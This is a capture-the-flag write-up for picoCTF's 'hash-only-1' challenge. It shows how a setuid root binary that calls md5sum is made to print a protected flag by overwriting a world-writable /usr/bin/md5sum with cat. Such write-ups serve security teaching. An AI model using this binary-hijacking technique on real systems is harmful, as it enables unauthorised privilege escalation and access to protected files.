# hash-only-1 #
 
## Overview ##

100 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #setuid`

## Description ##

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

Connect using ssh `<user>@<server> -p <pornum>` with the password, `<password>` and run the binary named `"flaghasher"`. 

You can get a copy of the binary if you wish: `scp -P <portnum> <user>@<server>:~/flaghasher` .

## Approach ##

Connecting to the challenge server to run the challenge binary, we see:

    $ ./flaghasher 
    Computing the MD5 hash of /root/flag.txt.... 

    8c9735f569157a799a98bd2014190786  /root/flag.txt

The challenge would be far too easy if we have access to `/root` or `/root/flag.txt`, but lets try anyway:

    $ ls /root
    ls: cannot open directory '/root': Permission denied

    $ cat /root/flag.txt
    cat: /root/flag.txt: Permission denied

Inspecting the strings of the `flaghasher` binary that contain `flag`:

    $ strings flaghasher | grep flag
    Computing the MD5 hash of /root/flag.txt.... 
    /bin/bash -c 'md5sum /root/flag.txt'

Also looking at the privileges of the `flaghasher` binary itself, to confirm a `setuid` binary, remembering a `setuid` binary runs at the privileges of the file' owner:

    $ ls -al
    total 24
    drwxr-xr-x 1 ctf-player ctf-player    20 Mar  7 20:28 .
    drwxr-xr-x 1 root       root          24 Mar  6 03:44 ..
    drwx------ 2 ctf-player ctf-player    34 Mar  7 20:28 .cache
    -rw-r--r-- 1 root       root          67 Mar  6 03:45 .profile
    -rwsr-xr-x 1 root       root       18312 Mar  6 03:45 flaghasher

So from the strings output we can see it's executing the `md5sum` command to calculate the hash, so lets confirm the whereabouts of this command:

    $ which md5sum
    /usr/bin/md5sum

Looking at the `md5sum` command's privileges:

    $ ls -al /usr/bin/m*
    -rwxr-xr-x 1 root root    320 Oct  6  2021 /usr/bin/man
    -rwxr-xr-x 1 root root 162552 Feb 16  2020 /usr/bin/mawk
    -rwxr-xr-x 1 root root  35120 Jul 21  2020 /usr/bin/mcookie
    -rwxrwxrwx 1 root root  47480 Sep  5  2019 /usr/bin/md5sum
    lrwxrwxrwx 1 root root      6 Sep  5  2019 /usr/bin/md5sum.textutils -> md5sum
    -rwxr-xr-x 1 root root  14568 Jul 21  2020 /usr/bin/mesg
    -rwxr-xr-x 1 root root  88408 Sep  5  2019 /usr/bin/mkdir
    -rwxr-xr-x 1 root root  67928 Sep  5  2019 /usr/bin/mkfifo
    -rwxr-xr-x 1 root root  72024 Sep  5  2019 /usr/bin/mknod
    -rwxr-xr-x 1 root root  47448 Sep  5  2019 /usr/bin/mktemp
    -rwxr-xr-x 1 root root  43160 Jul 21  2020 /usr/bin/more
    -rwsr-xr-x 1 root root  55528 Jul 21  2020 /usr/bin/mount
    -rwxr-xr-x 1 root root  14568 Jul 21  2020 /usr/bin/mountpoint
    -rwxr-xr-x 1 root root   6498 Jan 29 14:41 /usr/bin/mtrace
    -rwxr-xr-x 1 root root 149888 Sep  5  2019 /usr/bin/mv

So our aim is to hijack the `md5sum` command replacing it with something to dump our flag, such as `cat`.

Notice that all users have write access to `/usr/bin/md5sum`.

## Solution ##

Lets simply relace `/usr/bin/md5sum` with `/usr/bin/cat`:

    $ cp /usr/bin/cat /usr/bin/md5sum

    $ ./flaghasher 
    Computing the MD5 hash of /root/flag.txt.... 
    
    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.
